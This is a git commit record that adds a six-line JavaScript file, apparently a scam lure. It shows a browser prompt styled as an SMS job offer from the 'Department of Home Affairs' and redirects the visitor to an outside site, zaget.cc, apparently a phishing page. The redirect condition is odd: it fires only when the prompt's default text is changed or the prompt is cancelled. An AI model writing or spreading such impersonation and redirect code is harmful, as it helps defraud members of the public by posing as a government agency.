7eb912767578e6a9613d7240135261a1e2c0e827
surprise24x7 <132287490+surprise24x7@users.noreply.github.com>
2024-10-05 15:08:24 +0530

    Add files via upload

---
+++ homeaffairas.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLY NOW'
+password=prompt('SMS: Job is available for you at Department of Home Affairs. kindly press Ok to start application now ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://zaget.cc/home-affairs.sa.html';
+}
